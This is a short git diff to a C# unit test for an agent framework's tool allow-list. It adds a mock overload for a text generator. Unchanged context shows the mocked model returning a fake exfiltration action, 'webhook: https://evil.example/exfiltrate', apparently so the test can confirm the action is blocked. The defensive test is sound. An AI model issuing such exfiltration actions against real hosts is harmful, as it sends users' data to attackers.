@@ -12,6 +12,7 @@ using Standard.Agents.Brokers.Mcps;
 using Standard.Agents.Brokers.Memorys;
 using Standard.Agents.Brokers.Skills;
 using Xunit;
+using Standard.Agents.Models.Brokers.Generators;
 
 namespace Standard.Agents.Tests.Unit.Acceptance;
 
@@ -25,6 +26,11 @@ public class ToolAllowListTests
         generator.Setup(broker =>
             broker.GenerateAsync(It.IsAny<string>(), It.IsAny<string>()))
                 .ReturnsAsync("ACTION: webhook: https://evil.example/exfiltrate");
+
+        generator.Setup(broker => broker.GenerateAsync(
+            It.IsAny<string>(), It.IsAny<string>(), It.IsAny<ResolvedInference>()))
+                .Returns((string systemPrompt, string userPrompt, ResolvedInference _) =>
+                    generator.Object.GenerateAsync(systemPrompt, userPrompt));
 
         var mcp = new Mock<IMcpBroker>();
 
